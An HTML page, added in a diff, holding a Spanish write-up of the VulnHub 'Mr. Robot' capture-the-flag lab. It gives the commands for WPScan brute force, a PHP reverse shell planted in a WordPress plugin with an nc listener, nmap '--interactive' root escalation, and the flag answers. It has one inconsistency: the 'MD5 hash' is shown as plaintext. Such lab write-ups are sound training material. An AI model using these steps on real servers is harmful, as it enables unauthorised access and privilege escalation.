@@ -1,1 +1,631 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>CTF Mr. Robot - Write-up | Jose L. Trigo</title>
+  <meta name="description" content="Resolución completa del CTF Mr. Robot de VulnHub: enumeración, explotación de WordPress, reverse shell y escalada de privilegios." />
 
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Sans:ital,wght@0,300;0,400;0,600;1,400&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; }
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: "Fira Sans", sans-serif;
+      background: #020b14;
+      color: #cbd5dd;
+      -webkit-font-smoothing: antialiased;
+    }
+    a { color: #00a8ff; text-decoration: none; transition: color .2s; }
+    a:hover { color: #fff; text-decoration: none; }
+
+    .wrap {
+      max-width: 1280px;
+      margin: 28px auto;
+      padding: 24px;
+    }
+
+    /* --- HEADER FIJO (igual que el principal) --- */
+    .fixed-header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background: #000D1F;
+      color: #e3edf7;
+      border-bottom: 1px solid #00a8ff;
+      z-index: 1000;
+      padding: .5rem 1.5rem;
+      box-shadow: 0 2px 20px rgba(0, 168, 255, .15);
+    }
+    .header-content {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      max-width: 1132px;
+      margin: 0 auto;
+    }
+    .logo-container {
+      display: flex;
+      align-items: center;
+    }
+    .logo-img {
+      height: 38px;
+      width: auto;
+      display: block;
+    }
+    .nav-list {
+      list-style: none;
+      display: flex;
+      gap: 12px;
+      padding: 0;
+      margin: 0;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+    .nav-item {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 6px 14px;
+      border-radius: 4px;
+      background: #020b14;
+      color: #00a8ff;
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 700;
+      font-size: .85rem;
+      letter-spacing: .5px;
+      border: 1px solid rgba(0, 168, 255, .4);
+      box-shadow: 0 0 8px rgba(0, 168, 255, .05);
+      transition: all .2s ease;
+    }
+    .nav-item:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 0 12px rgba(0, 168, 255, .3);
+      background: #051628;
+      color: #fff;
+      border-color: #00a8ff;
+    }
+    .nav-item.active {
+      background: #00a8ff;
+      color: #020b14;
+      border-color: #00a8ff;
+    }
+    body { padding-top: 70px; }
+
+    /* --- SECCIONES --- */
+    section {
+      margin-bottom: 32px;
+      background: #051628;
+      border: 1px solid rgba(0, 168, 255, .2);
+      border-radius: 8px;
+      padding: 24px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, .3);
+      scroll-margin-top: 90px;
+    }
+    h1 {
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 700;
+      color: #e3edf7;
+      font-size: 2rem;
+      margin: 0 0 0.5rem 0;
+      border-left: 4px solid #00a8ff;
+      padding-left: 16px;
+    }
+    h2 {
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 700;
+      color: #e3edf7;
+      font-size: 1.5rem;
+      margin: 1.5rem 0 0.75rem 0;
+      border-bottom: 1px solid rgba(0, 168, 255, .2);
+      padding-bottom: 0.5rem;
+    }
+    h3 {
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 600;
+      color: #00a8ff;
+      font-size: 1.2rem;
+      margin: 1.2rem 0 0.5rem 0;
+    }
+    h4 {
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 500;
+      color: #cbd5dd;
+      font-size: 1rem;
+      margin: 1rem 0 0.25rem 0;
+    }
+    p, li {
+      color: #cbd5dd;
+      line-height: 1.6;
+      font-size: 0.95rem;
+    }
+    .lead {
+      color: #4a75a0;
+      font-size: 1rem;
+      margin-bottom: 1.2rem;
+    }
+    .subhead {
+      color: #4a75a0;
+      font-size: 0.9rem;
+      margin-top: -0.2rem;
+      margin-bottom: 1.2rem;
+    }
+
+    /* --- BANNER DE CABECERA DEL POST --- */
+    .post-header {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+      align-items: center;
+      margin-bottom: 24px;
+      background: #051628;
+      border-radius: 8px;
+      padding: 24px;
+      border: 1px solid rgba(0, 168, 255, .2);
+    }
+    .post-header .left {
+      flex: 1;
+      min-width: 260px;
+    }
+    .post-header .right {
+      flex: 0 0 200px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .post-header .right img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 6px;
+      border: 1px solid rgba(0, 168, 255, .3);
+    }
+
+    /* --- BLOQUES DE TERMINAL --- */
+    .term-block {
+      background: #020b14;
+      border: 1px solid rgba(0, 168, 255, .2);
+      border-radius: 6px;
+      padding: 12px 16px;
+      margin: 12px 0;
+      overflow-x: auto;
+      font-family: "JetBrains Mono", ui-monospace, monospace;
+      font-size: 0.85rem;
+      line-height: 1.6;
+      color: #cbd5dd;
+    }
+    .term-block .prompt {
+      color: #00a8ff;
+      font-weight: 700;
+    }
+    .term-block .output {
+      color: #e3edf7;
+    }
+    .term-block .comment {
+      color: #4a75a0;
+      font-style: italic;
+    }
+    .term-block .highlight {
+      color: #ffbd2e;
+    }
+
+    /* --- IMÁGENES --- */
+    figure {
+      margin: 20px 0;
+      text-align: center;
+    }
+    figure img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 6px;
+      border: 1px solid rgba(0, 168, 255, .15);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, .4);
+    }
+    figcaption {
+      color: #4a75a0;
+      font-size: 0.8rem;
+      margin-top: 6px;
+      font-family: "JetBrains Mono", monospace;
+    }
+
+    /* --- TABLAS --- */
+    .table-wrap {
+      overflow-x: auto;
+      margin: 16px 0;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.9rem;
+      background: #020b14;
+      border-radius: 6px;
+      border: 1px solid rgba(0, 168, 255, .15);
+    }
+    th, td {
+      padding: 10px 14px;
+      text-align: left;
+      border-bottom: 1px solid rgba(0, 168, 255, .1);
+    }
+    th {
+      color: #00a8ff;
+      font-weight: 700;
+      font-family: "JetBrains Mono", monospace;
+      background: #051628;
+    }
+    td {
+      color: #cbd5dd;
+    }
+    tr:last-child td {
+      border-bottom: none;
+    }
+
+    /* --- LISTAS --- */
+    ul, ol {
+      padding-left: 1.5rem;
+      color: #cbd5dd;
+    }
+    li {
+      margin-bottom: 0.3rem;
+    }
+
+    /* --- BOTÓN DE VOLVER --- */
+    .btn-back {
+      display: inline-block;
+      background: transparent;
+      border: 1px solid rgba(0, 168, 255, .4);
+      color: #00a8ff;
+      padding: 6px 16px;
+      border-radius: 4px;
+      font-family: "JetBrains Mono", monospace;
+      font-size: 0.8rem;
+      font-weight: 700;
+      transition: all 0.3s;
+      text-decoration: none;
+    }
+    .btn-back:hover {
+      background: #00a8ff;
+      color: #020b14;
+      border-color: #00a8ff;
+      box-shadow: 0 0 15px rgba(0, 168, 255, .3);
+    }
+
+    /* --- FOOTER --- */
+    footer {
+      padding: 20px;
+      margin-top: 12px;
+      border-top: 1px solid rgba(0, 168, 255, .15);
+      color: #4a75a0;
+      text-align: center;
+      font-size: .85rem;
+      font-family: "JetBrains Mono", monospace;
+    }
+
+    /* --- RESPONSIVE --- */
+    @media (max-width: 720px) {
+      .header-content { flex-direction: column; gap: 10px; }
+      body { padding-top: 110px; }
+      .nav-item { padding: 6px 10px; font-size: .75rem; }
+      .post-header .right { flex: 1; }
+      h1 { font-size: 1.6rem; }
+    }
+    @media (max-width: 480px) {
+      .wrap { padding: 12px; }
+      section { padding: 16px; }
+      .term-block { font-size: 0.75rem; padding: 10px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER FIJO (igual que el principal, enlazando a la raíz) -->
+  <header class="fixed-header">
+    <div class="header-content">
+      <span class="logo-container">
+        <a href="../../index.html">
+          <img src="../../imagenes/logo.png" alt="Logo JT" class="logo-img" />
+        </a>
+      </span>
+      <nav class="header-nav" aria-label="Navegación principal">
+        <ul class="nav-list">
+          <li><a class="nav-item" href="../../index.html#proyectos">Proyectos</a></li>
+          <li><a class="nav-item" href="../../herramientas/index.html">Herramientas</a></li>
+          <li><a class="nav-item" href="../../index.html#contacto">Contacto</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <div class="wrap">
+
+    <!-- ENCABEZADO DEL POST -->
+    <div class="post-header">
+      <div class="left">
+        <h1 style="border-left: none; padding-left: 0; margin: 0;">CTF: Mr. Robot (VulnHub)</h1>
+        <p class="subhead" style="margin-top: 4px;">Write‑up completo · José Luis Trigo Calvo</p>
+        <div style="display: flex; flex-wrap: wrap; gap: 12px; margin-top: 8px;">
+          <span style="background: #020b14; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(0,168,255,.2); color: #00a8ff; font-family: 'JetBrains Mono'; font-size: 0.75rem;">#WordPress</span>
+          <span style="background: #020b14; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(0,168,255,.2); color: #00a8ff; font-family: 'JetBrains Mono'; font-size: 0.75rem;">#ReverseShell</span>
+          <span style="background: #020b14; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(0,168,255,.2); color: #00a8ff; font-family: 'JetBrains Mono'; font-size: 0.75rem;">#Escalada</span>
+        </div>
+      </div>
+      <div class="right">
+        <img src="imagenes/mr_robot.png" alt="Mr. Robot CTF" style="max-width: 180px; border-radius: 6px;" />
+      </div>
+    </div>
+
+    <!-- DECLARACIÓN DE USO ÉTICO -->
+    <section style="margin-bottom: 24px;">
+      <h2 style="margin-top: 0;">Declaración de uso ético</h2>
+      <p>El contenido de este documento refleja el proceso de resolución de un CTF (Capture The Flag) con fines estrictamente educativos. Todas las herramientas y comandos empleados se han utilizado en un entorno controlado y autorizado, como parte de mi formación como ethical hacker. No se ha realizado ninguna actividad ilícita ni se ha atacado ningún sistema real sin consentimiento. El único propósito de este trabajo es el aprendizaje y la mejora de las habilidades en ciberseguridad.</p>
+    </section>
+
+    <!-- MÁQUINAS UTILIZADAS -->
+    <section style="margin-bottom: 24px;">
+      <h2>Máquinas utilizadas</h2>
+      <ul>
+        <li><strong>Kali Linux</strong>: <a href="https://www.kali.org/get-kali/#kali-virtual-machines" target="_blank">https://www.kali.org/get-kali/#kali-virtual-machines</a></li>
+        <li><strong>CTF MR Robot</strong>: <a href="https://www.vulnhub.com/entry/mr-robot-1,151/" target="_blank">https://www.vulnhub.com/entry/mr-robot-1,151/</a></li>
+      </ul>
+    </section>
+
+    <!-- RESOLUCIÓN PASO A PASO -->
+    <section>
+      <h2>Resolución paso a paso</h2>
+
+      <!-- 1. Reconocimiento -->
+      <h3>1. Reconocimiento de máquinas</h3>
+      <p>Ambas máquinas se encuentran dentro de una misma interfaz de red.</p>
+      <p>Con el comando <code>ip a</code> comprobamos la IP que ha sido asignada a nuestra máquina Kali Linux. (IP Kali Linux → 192.168.56.101)</p>
+      <p>Con el comando <strong><code>sudo nmap -sn 192.168.56.0/24</code></strong> buscamos la IP de nuestra máquina MR Robot.</p>
+      <figure>
+        <img src="imagenes/mr-robot1.png" alt="Resultado del escaneo de red con nmap" />
+        <figcaption>Escaneo de red: IP de MR Robot = 192.168.56.102</figcaption>
+      </figure>
+      <p>Ahora procederemos a escanear la máquina Mr Robot más a fondo para saber los servicios que está prestando y en qué puertos. Para ello utilizaremos el comando <strong><code>nmap -sV 192.168.56.102</code></strong>.</p>
+      <figure>
+        <img src="imagenes/mr-robot2.png" alt="Escaneo de puertos con nmap -sV" />
+        <figcaption>Puertos abiertos: 22 (ssh), 80 (http), 443 (https)</figcaption>
+      </figure>
+      <p>Como vemos, la máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 443 (HTTPS). Al introducir la IP en el navegador, comprobamos que el servidor web funciona correctamente y nos muestra una página con pistas.</p>
+      <figure>
+        <img src="imagenes/mr-robot3.png" alt="Página principal del servidor web de MR Robot" />
+        <figcaption>Página web principal</figcaption>
+      </figure>
+
+      <!-- 2. Enumeración Web -->
+      <h3>2. Enumeración Web</h3>
+      <p>Ahora que sabemos que hay un servidor web, vamos a realizar un escaneo de enumeración web con Nmap para descubrir directorios y archivos ocultos.</p>
+      <div class="term-block">
+        <span class="prompt">root@kali:~$</span> nmap --script=http-enum.nse -p 80 192.168.56.102
+      </div>
+      <figure>
+        <img src="imagenes/mr-robot4.png" alt="Resultado del script http-enum de Nmap" />
+        <figcaption>Enumeración con Nmap: se detecta WordPress y archivos como robots.txt</figcaption>
+      </figure>
+      <p>Este comando nos da mucha información. Sabemos que estamos ante un sitio WordPress y que el servidor tiene algunos archivos interesantes, como <code>robots.txt</code>.</p>
+      <p>Para complementar, utilizamos <strong>gobuster</strong> para un fuzzing más completo:</p>
+      <div class="term-block">
+        <span class="prompt">root@kali:~$</span> gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt
+      </div>
+      <figure>
+        <img src="imagenes/mr-robot4_1.png" alt="Resultado de gobuster" />
+        <figcaption>Directorio descubiertos con gobuster</figcaption>
+      </figure>
+      <p>Entre los hallazgos, el archivo <code>robots.txt</code> nos revela dos archivos:</p>
+      <ul>
+        <li><strong>fsocity.dic</strong></li>
+        <li><strong>key-1-of-3.txt</strong></li>
+      </ul>
+      <figure>
+        <img src="imagenes/mr-robot4_2.png" alt="Contenido de robots.txt" />
+        <figcaption>robots.txt muestra los archivos</figcaption>
+      </figure>
+      <p>Descargamos ambos con <code>wget</code>:</p>
+      <div class="term-block">
+        <span class="prompt">root@kali:~$</span> wget http://192.168.56.102/key-1-of-3.txt<br>
+        <span class="prompt">root@kali:~$</span> wget http://192.168.56.102/fsocity.dic
+      </div>
+      <p>La primera key es:</p>
+      <div class="term-block" style="border-color: #00a8ff;">
+        <span class="highlight">Key 1: 073403c8a58a1f80d943455fb30724b9</span>
+      </div>
+      <figure>
+        <img src="imagenes/mr-robot4_3.png" alt="Contenido de key-1-of-3.txt" />
+        <figcaption>Primera key encontrada</figcaption>
+      </figure>
+      <p>El diccionario <code>fsocity.dic</code> contiene posibles nombres o contraseñas para WordPress.</p>
+      <figure>
+        <img src="imagenes/mr-robot4_4.png" alt="Vista del diccionario fsocity.dic" />
+        <figcaption>fsocity.dic: 858.160 líneas</figcaption>
+      </figure>
+
+      <!-- 3. Explotación de WordPress -->
+      <h3>3. Explotación de WordPress</h3>
+      <p>Los usuarios y contraseñas comunes no funcionan, así que usaremos el diccionario obtenido.</p>
+      <p>Para reducir el tiempo, eliminamos duplicados:</p>
+      <div class="term-block">
+        <span class="prompt">root@kali:~$</span> wc -l fsocity.dic <span class="comment"># 858160</span><br>
+        <span class="prompt">root@kali:~$</span> sort fsocity.dic | uniq > words.dic<br>
+        <span class="prompt">root@kali:~$</span> wc -l words.dic <span class="comment"># 11451</span>
+      </div>
+      <p>Como es temática, creamos un archivo con nombres de personajes de la serie:</p>
+      <figure>
+        <img src="imagenes/mr-robot5.png" alt="Lista de usuarios potenciales" />
+        <figcaption>users.txt con nombres de la serie</figcaption>
+      </figure>
+      <p>Lanzamos el ataque de fuerza bruta con <strong>WPScan</strong>:</p>
+      <div class="term-block">
+        <span class="prompt">root@kali:~$</span> wpscan --url http://192.168.56.102 -U users.txt -P words.dic --password-attack wp-login
+      </div>
+      <figure>
+        <img src="imagenes/mr-robot6.png" alt="Resultado de WPScan" />
+        <figcaption>WPScan encuentra dos usuarios: Elliot y elliot, con la misma contraseña: ER28-0652</figcaption>
+      </figure>
+      <p>Probamos con el usuario <strong>Elliot</strong> y accedemos al panel de WordPress.</p>
+      <figure>
+        <img src="imagenes/mr-robot7.png" alt="Acceso al panel de WordPress" />
+        <figcaption>Dashboard de WordPress</figcaption>
+      </figure>
+
+      <p><strong>Segunda opción:</strong> En el directorio <code>/license</code> encontramos una pista adicional.</p>
+      <figure>
+        <img src="imagenes/mr-robot8.png" alt="Página de licencia" />
+        <figcaption>Página de licencia</figcaption>
+      </figure>
+      <figure>
+        <img src="imagenes/mr-robot9.png" alt="Código en base64" />
+        <figcaption>Fragmento codificado en base64</figcaption>
+      </figure>
+      <p>Desciframos con:</p>
+      <div class="term-block">
+        <span class="prompt">root@kali:~$</span> echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
+      </div>
+      <figure>
+        <img src="imagenes/mr-robot9.png" alt="Resultado del descifrado" />
+        <figcaption>Usuario: elliot, Contraseña: ER28-0652</figcaption>
+      </figure>
+
+      <p>Ahora, para obtener una shell reversa, editaremos un plugin de WordPress e insertaremos código PHP de reverse shell (obtenido de <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">pentestmonkey/php-reverse-shell</a>).</p>
+      <figure>
+        <img src="imagenes/mr-robot10.png" alt="Editor de plugin con el código de reverse shell" />
+        <figcaption>Inserción del código en un plugin</figcaption>
+      </figure>
+      <p><strong>Importante:</strong> La IP en el código debe ser la de la máquina atacante (Kali).</p>
+      <p>En una terminal de Kali, abrimos un listener con <code>nc</code>:</p>
+      <div class="term-block">
+        <span class="prompt">root@kali:~$</span> nc -lnvp 5555
+      </div>
+      <figure>
+        <img src="imagenes/mr-robot10.png" alt="Listener netcat" />
+        <figcaption>Listener en puerto 5555</figcaption>
+      </figure>
+      <p>Activamos el plugin desde WordPress y obtenemos la shell:</p>
+      <figure>
+        <img src="imagenes/mr-robot11.png" alt="Reverse shell establecida" />
+        <figcaption>Shell conectada</figcaption>
+      </figure>
+      <p>Una vez dentro, exploramos el sistema:</p>
+      <div class="term-block">
+        <span class="prompt">www-data@robot:~$</span> pwd<br>
+        <span class="prompt">www-data@robot:~$</span> id<br>
+        <span class="prompt">www-data@robot:~$</span> whoami<br>
+        <span class="prompt">www-data@robot:~$</span> ls -la /home
+      </div>
+      <figure>
+        <img src="imagenes/mr-robot12.png" alt="Comandos básicos en la shell" />
+        <figcaption>Exploración inicial</figcaption>
+      </figure>
+      <p>Encontramos el directorio <code>/home/robot</code> con los archivos <code>key-2-of-3.txt</code> y <code>password.raw-md5</code>.</p>
+      <figure>
+        <img src="imagenes/mr-robot13.png" alt="Contenido de /home/robot" />
+        <figcaption>Archivos del usuario robot</figcaption>
+      </figure>
+      <p>No tenemos permisos para leer <code>key-2-of-3.txt</code>, pero sí podemos ver <code>password.raw-md5</code>:</p>
+      <div class="term-block">
+        <span class="prompt">www-data@robot:/home/robot$</span> cat password.raw-md5
+        <div class="output">robot:abcdefghijklmnopqrstuvwxyz</div>
+      </div>
+      <p>El hash MD5 se descifra fácilmente (por ejemplo, con <a href="https://www.dcode.fr/funcion-hash-md5" target="_blank">dCode.fr</a>) y obtenemos la contraseña: <strong>abcdefghijklmnopqrstuvwxyz</strong>.</p>
+      <figure>
+        <img src="imagenes/mr-robot13_1.png" alt="Descifrado MD5" />
+        <figcaption>Contraseña desencriptada</figcaption>
+      </figure>
+
+      <!-- 4. Escalada de privilegios -->
+      <h3>4. Escalada de privilegios</h3>
+      <p>Intentamos cambiar al usuario <code>robot</code> con <code>su robot</code>, pero la terminal no permite ejecutar comandos root. Buscamos binarios SUID:</p>
+      <div class="term-block">
+        <span class="prompt">www-data@robot:~$</span> find / -user root -perm -4000 -type f 2>/dev/null
+      </div>
+      <figure>
+        <img src="imagenes/mr-robot14.png" alt="Búsqueda de binarios SUID" />
+        <figcaption>Lista de binarios SUID</figcaption>
+      </figure>
+      <p>Entre ellos, <strong>nmap</strong> (versión 3.81) es vulnerable a una escalada mediante el modo interactivo. Consultamos <a href="https://medium.com/@abinreji8/interactive-mode-vulnerability-in-nmap-3-81-971ddfd1b27a" target="_blank">este artículo</a>.</p>
+      <p>Ejecutamos:</p>
+      <div class="term-block">
+        <span class="prompt">www-data@robot:~$</span> nmap --interactive<br>
+        <span class="prompt">nmap></span> !sh
+      </div>
+      <p>Una vez dentro, somos <code>root</code>. Podemos leer la segunda key:</p>
+      <div class="term-block">
+        <span class="prompt">root@robot:~#</span> cat /home/robot/key-2-of-3.txt<br>
+        <span class="output">822c73956184f694993bede3eb39f959</span>
+      </div>
+      <figure>
+        <img src="imagenes/mr-robot15.png" alt="Escalada a root y obtención de key 2" />
+        <figcaption>Key 2 obtenida</figcaption>
+      </figure>
+      <p>Buscamos la tercera key con <code>find</code>:</p>
+      <div class="term-block">
+        <span class="prompt">root@robot:~#</span> find /home /var /etc /root -name "key-3-of-3.txt" 2>/dev/null
+      </div>
+      <figure>
+        <img src="imagenes/mr-robot16.png" alt="Búsqueda de key 3" />
+        <figcaption>La key 3 se encuentra en /root</figcaption>
+      </figure>
+      <p>La leemos:</p>
+      <div class="term-block">
+        <span class="prompt">root@robot:~#</span> cat /root/key-3-of-3.txt<br>
+        <span class="output">04787ddef27c3dee1ee161b21670b4e4</span>
+      </div>
+
+      <!-- 5. Resultados -->
+      <h3>5. Resultados obtenidos</h3>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Key</th><th>Valor</th></tr>
+          </thead>
+          <tbody>
+            <tr><td><strong>Key 1</strong></td><td>073403c8a58a1f80d943455fb30724b9</td></tr>
+            <tr><td><strong>Key 2</strong></td><td>822c73956184f694993bede3eb39f959</td></tr>
+            <tr><td><strong>Key 3</strong></td><td>04787ddef27c3dee1ee161b21670b4e4</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Herramientas utilizadas</h3>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Herramienta</th><th>Uso</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Nmap</td><td>Descubrimiento de hosts y escaneo de puertos</td></tr>
+            <tr><td>Gobuster</td><td>Fuzzing de directorios web</td></tr>
+            <tr><td>WPScan</td><td>Ataque de fuerza bruta a WordPress</td></tr>
+            <tr><td>netcat (nc)</td><td>Establecimiento de reverse shell</td></tr>
+            <tr><td>find</td><td>Búsqueda de binarios SUID</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Conclusión</h3>
+      <p>La resolución de la máquina MR Robot me ha permitido poner en práctica técnicas fundamentales de ciberseguridad ofensiva:</p>
+      <ul>
+        <li>Enumeración web para descubrir recursos ocultos (<code>robots.txt</code>, <code>fsocity.dic</code>)</li>
+        <li>Ataque de fuerza bruta con WPScan para obtener credenciales</li>
+        <li>Reverse Shell mediante inyección de código PHP en WordPress</li>
+        <li>Escalada de privilegios aprovechando binarios SUID vulnerables (nmap 3.81)</li>
+      </ul>
+
+      <!-- Botón de volver al portfolio -->
+      <div style="margin-top: 30px; text-align: center;">
+        <a href="../../index.html#proyectos" class="btn-back">← Volver al portfolio</a>
+      </div>
+
+    </section>
+
+    <footer>
+      © 2026 Jose L. Trigo · Ethical Hacker · Write‑up del CTF Mr. Robot
+    </footer>
+
+  </div> <!-- /wrap -->
+
+</body>
+</html>
